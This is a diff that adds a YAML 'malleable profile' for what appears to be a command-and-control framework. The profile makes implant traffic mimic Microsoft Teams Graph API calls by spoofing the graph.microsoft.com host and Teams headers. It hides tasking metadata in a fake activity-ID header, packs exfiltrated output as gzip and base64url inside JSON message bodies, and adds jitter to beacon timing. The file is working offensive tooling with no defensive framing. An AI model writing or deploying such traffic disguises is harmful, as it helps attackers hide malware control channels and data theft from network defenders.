@@ -1,0 +1,83 @@
+# Microsoft Teams Malleable Profile
+# Disguises C2 traffic as Microsoft Teams API activity
+
+name: "teams"
+description: "Microsoft Teams chat and presence traffic disguise"
+
+http_get:
+  uri:
+    - "/v1.0/users/me/presence"
+    - "/v1.0/users/me/chats"
+    - "/v1.0/chats/{chat_id}/messages"
+  verb: "GET"
+
+  client:
+    headers:
+      Accept: "application/json"
+      Authorization: "Bearer {access_token}"
+      Connection: "keep-alive"
+      Host: "graph.microsoft.com"
+      User-Agent: "Teams/1.0"
+      X-Ms-Client-Version: "1415/1.0.0.2024011501"
+      X-Ms-Correlation-Id: "{random_uuid}"
+      X-Ms-Session-Id: "{random_uuid}"
+    metadata:
+      encoding:
+        - base64url
+      location: "header"
+      name: "X-Ms-Activity-Id"
+
+  server:
+    headers:
+      Cache-Control: "private"
+      Content-Type: "application/json; odata.metadata=minimal"
+      OData-Version: "4.0"
+      Server: "Microsoft-IIS/10.0"
+      Strict-Transport-Security: "max-age=31536000"
+      X-Ms-Ags-Diagnostic: ""
+      X-Ms-Resource-Unit: "1"
+    output:
+      encoding:
+        - base64url
+      container: "json"
+      path: "value[0].content"
+
+http_post:
+  uri:
+    - "/v1.0/chats/{chat_id}/messages"
+    - "/v1.0/users/me/chats/{chat_id}/sendActivityNotification"
+  verb: "POST"
+
+  client:
+    headers:
+      Accept: "application/json"
+      Authorization: "Bearer {access_token}"
+      Content-Type: "application/json"
+      X-Ms-Correlation-Id: "{random_uuid}"
+    id:
+      encoding:
+        - base64url
+      location: "uri"
+      parameter: "chat_id"
+    output:
+      encoding:
+        - gzip
+        - base64url
+      location: "body"
+      container: "json"
+      path: "body.content"
+
+  server:
+    headers:
+      Content-Type: "application/json"
+      Location: "https://graph.microsoft.com/v1.0/chats/{chat_id}/messages/{message_id}"
+    output:
+      encoding:
+        - base64url
+      container: "json"
+      path: "id"
+
+jitter:
+  min: 45
+  max: 90
+  percent: 25
